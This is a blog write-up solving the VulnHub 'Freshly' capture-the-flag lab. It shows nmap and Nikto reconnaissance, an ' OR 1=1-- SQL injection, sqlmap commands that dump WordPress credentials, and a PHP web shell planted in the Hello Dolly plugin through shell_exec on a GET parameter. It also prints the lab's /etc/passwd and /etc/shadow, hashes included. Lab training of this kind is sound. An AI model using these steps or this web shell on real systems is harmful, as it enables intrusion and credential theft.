---
layout: post
title:  "VulnHub Freshly Solution"
date:   2015-12-05 00:00:00
description: Finally Something I Can Solve
tags: Security
---

This is my solution for VulnHub's [Freshly](https://www.vulnhub.com/entry/tophatsec-freshly,118/) challenge.

### Host and Service Discovery

I started by finding the host's IP address in my local network.

~~~
$ arp -v

Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.0.104            ether   08:00:27:f2:73:82   C                     wlan0
192.168.0.1              ether   c0:4a:00:65:77:d6   C                     wlan0
~~~

Now I know its IP address is 192.168.0.104. Then, I proceed to checking the services running there.

~~~
$ sudo nmap -Pn 192.168.0.104

Starting Nmap 6.40 ( http://nmap.org ) at 2015-11-28 17:13 WIB
Nmap scan report for 192.168.0.104
Host is up (0.0011s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
~~~

For more details on the service, you can run this.

~~~
$ sudo nmap -T5 -A -v 192.168.0.104 -p 0-6553
~~~

Only those three is going to get any results from this brutal scanning though.

### The Web Application

I proceed by checking the services by using a web browser.

#### 1. http://192.16.0.104

I only found a page containing a gif image of a scene from Star Wars here.

![These aren't the droids you're looking for](/images/posts/freshly-star-wars.gif)

#### 2. https://192.16.0.104 and http://192.1680.104:8080

Here, we have a web e-commerce based on WordPress on `/wordpress`.

![Screenshot-01](/images/posts/freshly-wordpress-01.png)

### Nikto Scan

The addresses I scanned with Nikto are as follows:

- 192.168.0.104
- 192.168.0.104:8080
- 192.168.0.104:8080/wordpress

Here are the findings from Nikto (I threw away the false positives).

#### 1. 192.168.0.104

- `/phpmyadmin/`
- `/icons/README`
- `/login.php`

#### 2. 192.168.0.104:8080

- `/img/` (vulnerable with directory indexing)
- `/wordpress/`

#### 3. 192.168.0.104:8080/wordpress

- `/xmlrpc.php`
- `/wp-content/plugins/hello.php`
- `/license.txt`
- `/wp-login/`

### Checking the Results

Here's how `/login.php` in 192.16.0.104 looks like.

![Screenshot-02](/images/posts/freshly-login-01.png)

I tried to login with a random username and password.

![Screenshot-03](/images/posts/freshly-login-02.png)

Then I tried to do SQL injecton here with `' OR 1=1--` as the username and password.

![Screenshot-04](/images/posts/freshly-login-03.png)

It respond with `1` instead of `0` as when I tried random username and password combinations. Seems like it's responding to the SQL injection.

For the next part, from 192.168.0.104:8080/wordpress on `/wp-content/plugins/hello.php` returned this.

~~~
Fatal error: Call to undefined function add_action() in /opt/wordpress-4.1-0/apps/wordpress/htdocs/wp-content/plugins/hello.php on line 60
~~~

After some googling on this `hello.php` file on WordPress, I found out that it belongs to a plugin called Hello Dolly.

### Gaining Access

For `/login.php`, I'm using sqlmap to exploit the SQL injection vulnerability. Since it's a POST request and it's a bit bothersome to manually craft a POST request in sqlmap, I use Burp Suite to interrupt the POST request and put the content in a file called `request.txt`.

~~~
POST /login.php HTTP/1.1
Host: 192.168.0.104
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.104/login.php
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

user=testing&password=testing&s=Submit
~~~

Then, I run sqlmap using this `request.txt` file as the request content.

~~~
$ ./sqlmap.py -r request.txt --dbs
~~~

It returned the list of databases in the system.

~~~
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080
~~~

Let's try checking out the `wordpress8080` database's tables.

~~~
$ ./sqlmap.py -r request.txt -D wordpress8080 --tables
~~~

It only have `users` table.

~~~
Database: wordpress8080
[1 table]
+-------+
| users |
+-------+
~~~

Well, let's see what's inside the table.

~~~
$ ./sqlmap.py -r request.txt -D wordpress8080 -T users --dump
~~~

The table only has one record.

~~~
username,password
admin,SuperSecretPassword
~~~

We can use that to log in to the WordPress site.

Now if we go to the plugin management page in the WordPress admin, we can find the inactive Hello Dolly plugin. Let's try activating it.

![Screenshot-05](/images/posts/freshly-wordpress-02.png)

The Hello Dolly plugin will show a random line from a Louis Armstrong's song [Hello, Dolly!](http://www.lyricsfreak.com/l/louis+armstrong/hello+dolly_20085335.html) on the admin panel.

![Screenshot-06](/images/posts/freshly-wordpress-03.png)

We can modify what it prints by editing the plugin. Change the content of `hello_dolly_get_lyric()` with the following.

~~~php
function hello_dolly_get_lyric() {
  /** These are the lyrics to Hello Dolly */
  $lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
So, take her wrap, fellas
Find her an empty lap, fellas
Dolly'll never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
We feel the room swayin'
While the band's playin'
One of your old favourite songs from way back when
Golly, gee, fellas
Find her a vacant knee, fellas
Dolly'll never go away
Dolly'll never go away
Dolly'll never go away again";

  // Here we split it into lines
  $lyrics = explode( "\n", $lyrics );

  // And then randomly choose a line
  //return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
  $lyrics = "<pre>".shell_exec($_GET['cmd'])."</pre>";
  return  wptexturize($lyrics);
}
~~~

See that I commented the return value, change the `$lyrics` variable to print the execution result of shell commands we put in `cmd` GET parameter and put it on the page. Try the following GET request.

~~~
http://192.168.0.104:8080/wordpress/wp-admin/index.php?cmd=ls%20-l
~~~

This is what we're going to get.

![Screenshot-07](/images/posts/freshly-wordpress-04.png)

We're able to see the content of `/etc/passwd`.

![Screenshot-08](/images/posts/freshly-wordpress-05.png)

And also `/etc/shadow` (which is not usually readable unless for root).

![Screenshot-09](/images/posts/freshly-wordpress-06.png)

Notice the last two lines in both files.

~~~
/etc/passwd
# YOU STOLE MY SECRET FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"

/etc/shadow
# YOU STOLE MY PASSWORD FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
~~~

I wasn't really sure if it's the flag that have to be captured in this challenge, so I checked other walkthrough to see what is the flag file that needs to be captured (since it's not mentioned in the challenge's goal). But seems like it really is the flag.

Here's the full content of the files for `/etc/passwd`.

~~~
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
~~~

And this one is for `/etc/shadow`.

~~~
root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
daemon:*:16483:0:99999:7:::
bin:*:16483:0:99999:7:::
sys:*:16483:0:99999:7:::
sync:*:16483:0:99999:7:::
games:*:16483:0:99999:7:::
man:*:16483:0:99999:7:::
lp:*:16483:0:99999:7:::
mail:*:16483:0:99999:7:::
news:*:16483:0:99999:7:::
uucp:*:16483:0:99999:7:::
proxy:*:16483:0:99999:7:::
www-data:*:16483:0:99999:7:::
backup:*:16483:0:99999:7:::
list:*:16483:0:99999:7:::
irc:*:16483:0:99999:7:::
gnats:*:16483:0:99999:7:::
nobody:*:16483:0:99999:7:::
libuuid:!:16483:0:99999:7:::
syslog:*:16483:0:99999:7:::
messagebus:*:16483:0:99999:7:::
user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
mysql:!:16483:0:99999:7:::
candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
# YOU STOLE MY PASSWORD FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
~~~
